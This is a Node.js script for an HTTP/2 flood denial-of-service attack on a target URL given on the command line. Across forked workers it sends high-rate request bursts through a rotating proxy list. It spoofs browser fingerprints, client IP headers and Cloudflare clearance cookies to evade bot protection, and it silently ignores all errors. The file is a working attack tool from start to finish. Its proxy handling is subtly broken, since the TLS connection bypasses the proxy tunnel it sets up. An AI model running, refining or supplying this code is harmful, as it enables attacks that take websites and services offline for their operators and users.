const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;
process.on('uncaughtException', () => {});

if (process.argv.length < 7) {
    console.log("Usage: node script.js <target> <time> <rate> <threads> <proxy_file>");
    process.exit(1);
}

function readLines(filePath) {
    if (!fs.existsSync(filePath)) {
        console.log("Proxy file not found!");
        process.exit(1);
    }
    const lines = fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/).filter(line => line.trim());
    if (!lines.length) {
        console.log("Proxy file is empty!");
        process.exit(1);
    }
    return lines;
}

function randomIntn(min, max) {
    return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(elements) {
    return elements[randomIntn(0, elements.length)];
}

function randstr(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789-_";
    let result = "";
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * characters.length));
    }
    return result;
}

const args = {
    target: process.argv[2],
    time: parseInt(process.argv[3]),
    rate: parseInt(process.argv[4]),
    threads: parseInt(process.argv[5]),
    proxyFile: process.argv[6]
};

const parsedTarget = url.parse(args.target);
if (!parsedTarget.protocol || !parsedTarget.host) {
    console.log("Invalid target URL!");
    process.exit(1);
}

const userAgents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.1 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 15; Mobile; rv:131.0) Gecko/131.0 Firefox/131.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Windows NT 11.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 15_0) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/19.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:130.0) Gecko/20100101 Firefox/130.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/129.0.0.0",
    "Mozilla/5.0 (iPad; CPU OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Android 14; Mobile; rv:130.0) Gecko/130.0 Firefox/130.0"
];

const accept_header = [
    "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
    "application/json, text/plain, */*",
    "image/jpeg, image/png, */*",
    "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "application/xml,application/json,text/html;q=0.9, */*;q=0.1"
];

const lang_header = [
    "en-US,en;q=0.9",
    "vi-VN,vi;q=0.9,en-US;q=0.8",
    "zh-CN,zh;q=0.9,en;q=0.8",
    "fr-FR,fr;q=0.9,en;q=0.8",
    "es-ES,es;q=0.9,en;q=0.8",
    "de-DE,de;q=0.9,en;q=0.8",
    "ja-JP,ja;q=0.9,en;q=0.8"
];

const encoding_header = [
    "gzip, deflate, br, zstd",
    "gzip, deflate",
    "br, zstd",
    "compress, gzip"
];

const sec_fetch_headers = {
    "sec-fetch-dest": ["document", "script", "image", "font", "style", "empty"],
    "sec-fetch-mode": ["navigate", "cors", "no-cors", "same-origin", "websocket"],
    "sec-fetch-site": ["same-origin", "same-site", "cross-site", "none"]
};

const cache_control = [
    "no-cache",
    "max-age=0",
    "no-store",
    "must-revalidate"
];

const referers = [
    `https://${parsedTarget.host}/`,
    `https://${parsedTarget.host}${parsedTarget.path}`,
    `https://${parsedTarget.host}/search?q=${randstr(6)}`,
    "https://www.google.com/",
    "https://www.bing.com/",
    "https://www.yahoo.com/",
    "https://duckduckgo.com/",
    ""
];

const platforms = [
    "Windows",
    "Macintosh",
    "Linux",
    "iPhone",
    "Android",
    "iPad",
    "X11"
];

const sec_ch_ua = [
    '"Google Chrome";v="129", "Chromium";v="129", "Not.A/Brand";v="99"',
    '"Firefox";v="131"',
    '"Safari";v="18.1"',
    '"Microsoft Edge";v="129"',
    '"Google Chrome";v="128", "Chromium";v="128", "Not.A/Brand";v="99"',
    '"Firefox";v="130"',
    '"Safari";v="19.0"'
];

const sec_ch_ua_full_version = [
    '"129.0.6668.100"',
    '"131.0.0.0"',
    '"18.1.0"',
    '"129.0.2792.79"',
    '"128.0.6613.137"',
    '"130.0.0.0"',
    '"19.0.0"'
];

const ciphers = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_AES_128_GCM_SHA256",
    "TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384",
    "TLS_ECDHE_ECDSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_RSA_WITH_CHACHA20_POLY1305_SHA256",
    "TLS_ECDHE_ECDSA_WITH_AES_256_CBC_SHA",
    "TLS_ECDHE_RSA_WITH_AES_128_CBC_SHA"
].join(":");

const proxies = readLines(args.proxyFile);

if (cluster.isMaster) {
    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
    setTimeout(() => process.exit(0), args.time * 1000);
} else {
    setInterval(runFlooder, 0);
}

class NetSocket {
    constructor() {}

    async HTTP(options) {
        return new Promise((resolve, reject) => {
            const payload = `CONNECT ${options.address}:443 HTTP/1.1\r\nHost: ${options.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
            const buffer = Buffer.from(payload);
            const connection = net.connect({
                host: options.host,
                port: options.port,
                noDelay: true
            });

            connection.setTimeout(options.timeout * 1000);
            connection.setKeepAlive(true, 60000);

            connection.on("connect", () => {
                connection.write(buffer);
            });

            connection.on("data", chunk => {
                const response = chunk.toString("utf-8");
                if (!response.includes("HTTP/1.1 200")) {
                    connection.destroy();
                    return reject("invalid proxy response");
                }
                return resolve(connection);
            });

            connection.on("timeout", () => {
                connection.destroy();
                reject("timeout");
            });

            connection.on("error", () => {
                connection.destroy();
                reject("error");
            });
        });
    }
}

const Socker = new NetSocket();

function generateDynamicPath() {
    const basePath = parsedTarget.path === "/" ? "" : parsedTarget.path;
    const queries = [
        `q=${encodeURIComponent(randstr(8))}`,
        `id=${randomIntn(1000, 99999)}`,
        `page=${randomIntn(1, 50)}`,
        `token=${randstr(12)}`,
        `lang=${randomElement(['en', 'vi', 'zh', 'fr', 'es', 'de', 'ja'])}`,
        `category=${randstr(8)}`,
        `ref=${randstr(6)}`,
        `session=${randstr(16)}`
    ];
    const queryCount = randomIntn(2, 6);
    return `${basePath}?${queries.slice(0, queryCount).join('&')}`;
}

function generateDynamicHeaders() {
    const uaIndex = randomIntn(0, userAgents.length);
    const headers = {
        ":method": randomElement(["GET", "POST"]),
        ":authority": parsedTarget.host,
        ":path": generateDynamicPath(),
        ":scheme": "https",
        "user-agent": userAgents[uaIndex],
        "accept": randomElement(accept_header),
        "accept-language": randomElement(lang_header),
        "accept-encoding": randomElement(encoding_header),
        "sec-fetch-dest": randomElement(sec_fetch_headers["sec-fetch-dest"]),
        "sec-fetch-mode": randomElement(sec_fetch_headers["sec-fetch-mode"]),
        "sec-fetch-site": randomElement(sec_fetch_headers["sec-fetch-site"]),
        "sec-ch-ua": sec_ch_ua[uaIndex],
        "sec-ch-ua-mobile": randomElement(["?0", "?1"]),
        "sec-ch-ua-platform": platforms[uaIndex % platforms.length],
        "sec-ch-ua-full-version-list": sec_ch_ua_full_version[uaIndex],
        "upgrade-insecure-requests": "1",
        "priority": randomElement(["u=0, i", "u=1", "u=2"]),
        "cache-control": randomElement(cache_control),
        "referer": randomElement(referers),
        "x-forwarded-for": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`,
        "x-real-ip": `${randomIntn(1, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}.${randomIntn(0, 255)}`,
        "sec-ch-prefers-color-scheme": randomElement(["light", "dark"]),
        "sec-ch-viewport-width": randomIntn(800, 2560).toString(),
        "cookie": `__cfduid=${randstr(32)}; cf_clearance=${randstr(40)}; session=${randstr(16)}; _ga=${randstr(20)}`,
        "x-requested-with": randomElement(["XMLHttpRequest", ""])
    };
    if (headers[":method"] === "POST") {
        headers["content-type"] = randomElement(["application/x-www-form-urlencoded", "application/json"]);
        headers["content-length"] = randomIntn(10, 100);
    }
    return headers;
}

async function checkProxy(proxyAddr) {
    const [host, port] = proxyAddr.split(":");
    try {
        const connection = await Socker.HTTP({
            host,
            port: parseInt(port),
            address: parsedTarget.host + ":443",
            timeout: 1
        });
        connection.destroy();
        return true;
    } catch {
        return false;
    }
}

async function runFlooder() {
    let proxyAddr = randomElement(proxies);
    let parsedProxy = proxyAddr.split(":");
    while (!(parsedProxy[0] && parsedProxy[1] && await checkProxy(proxyAddr))) {
        proxyAddr = randomElement(proxies);
        parsedProxy = proxyAddr.split(":");
    }

    const proxyOptions = {
        host: parsedProxy[0],
        port: parseInt(parsedProxy[1]),
        address: parsedTarget.host + ":443",
        timeout: 5
    };

    try {
        const connection = await Socker.HTTP(proxyOptions);
        const tlsOptions = {
            secure: true,
            ALPNProtocols: ['h2'],
            ciphers: ciphers,
            host: parsedTarget.host,
            servername: parsedTarget.host,
            rejectUnauthorized: false,
            minVersion: 'TLSv1.2',
            maxVersion: 'TLSv1.3',
            ecdhCurve: 'X25519:P-256:P-384',
            sigalgs: 'ecdsa_secp256r1_sha256:rsa_pss_rsae_sha256:rsa_pkcs1_sha256',
            secureOptions: crypto.constants.SSL_OP_NO_RENEGOTIATION | crypto.constants.SSL_OP_NO_TICKET
        };

        const tlsConn = tls.connect(443, parsedTarget.host, tlsOptions);
        tlsConn.setKeepAlive(true, 60000);

        const client = http2.connect(parsedTarget.href, {
            protocol: "https:",
            settings: {
                headerTableSize: 65536,
                maxConcurrentStreams: 1000,
                initialWindowSize: 10485760,
                maxHeaderListSize: 524288,
                enablePush: false
            },
            createConnection: () => tlsConn
        });

        client.on("connect", () => {
            const intervalAttack = setInterval(async () => {
                const dynHeaders = generateDynamicHeaders();
                for (let i = 0; i < args.rate * 3; i++) {
                    const request = client.request(dynHeaders, { timeout: 200 });
                    if (dynHeaders[":method"] === "POST") {
                        request.write(Buffer.alloc(randomIntn(10, 50)));
                    }
                    request.on("response", () => {
                        request.close(http2.constants.NGHTTP2_NO_ERROR);
                    });
                    request.on("error", () => {
                        request.close(http2.constants.NGHTTP2_CANCEL);
                    });
                    request.end();
                }
                await new Promise(r => setTimeout(r, randomIntn(5, 20)));
            }, 0);

            setTimeout(() => {
                clearInterval(intervalAttack);
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
            }, args.time * 1000);
        });

        client.on("error", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });

        client.on("close", () => {
            client.destroy();
            tlsConn.destroy();
            connection.destroy();
        });
    } catch (error) {
        setTimeout(runFlooder, 200);
    }
}
